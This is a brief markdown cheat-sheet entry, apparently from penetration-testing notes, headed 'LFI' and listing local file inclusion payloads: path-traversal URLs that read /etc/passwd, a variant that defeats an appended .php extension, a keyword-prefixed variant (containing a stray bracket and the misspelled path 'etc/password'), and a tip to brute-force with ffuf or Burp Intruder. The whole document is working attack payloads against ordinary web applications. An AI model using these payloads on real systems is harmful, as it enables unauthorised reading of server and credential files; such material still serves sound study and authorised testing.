## LFI
```
# For site that append .php to the end of the url:
http://[URL]/?page=../../../../../../../etc/passwd&ext=

# For site that requires certain keyword:
http://[URL]/?page=[keyword])../../../../../../etc/password

# If site return error code on fail, use ffuf or burp intruder
```
